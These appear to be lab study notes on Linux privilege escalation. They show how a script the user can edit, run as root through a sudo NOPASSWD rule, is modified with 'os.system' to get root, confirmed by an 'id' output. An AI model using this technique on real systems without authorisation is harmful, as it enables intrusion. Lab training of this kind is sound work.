# Linux Internals-based Privilege Escalation
`The Guide`

- [Python Library Hijacking](#python-library-hijacking)


## Python Library Hijacking
**Wrong permissions**
```bash
ls -la mem_status.py
-rw-rwxr-x 1 htb-student htb-student 491 Nov  4 07:15 mem_status.py
```
```bash
Matching Defaults entries for htb-student on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python3 /home/user/mem_status.py
```
> Looking at the result of above commands we can execute this python code as root.

### Root
```bash
$ sudo /usr/bin/python3 /home/user/mem_status.py 
uid=0(root) gid=0(root) groups=0(root)
Available memory: 88.78%
```
`contents of mem_status.py`
```python
#!/usr/bin/env python3
import psutil 

# RED CODE
import os
os.system('id')

available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total

print(f"Available memory: {round(available_memory, 2)}%")
```